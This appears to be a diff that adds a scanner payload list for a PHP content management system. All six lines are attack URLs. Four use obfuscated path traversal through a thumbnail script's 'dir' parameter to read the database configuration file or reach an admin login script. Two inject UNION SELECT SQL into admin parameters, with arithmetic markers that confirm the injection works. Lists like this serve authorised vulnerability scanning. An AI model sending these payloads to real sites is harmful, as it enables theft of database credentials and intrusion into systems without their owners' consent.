@@ -1,0 +1,6 @@
+/include/thumb.php?dir=http\..\admin\login\login_check.php
+/admin/?n=product&c=product_admin&a=dopara&app_type=shop&id=1%20union%20SELECT%201,2,3,25367*75643,5,6,7%20limit%205,1%20%23
+/admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+98989*443131,1--+&site=admin
+/include/thumb.php?dir=http/.....///.....///config/config_db.php
+/include/thumb.php?dir=.....///http/.....///config/config_db.php
+/include/thumb.php?dir=http\\..\\..\\config\\config_db.php
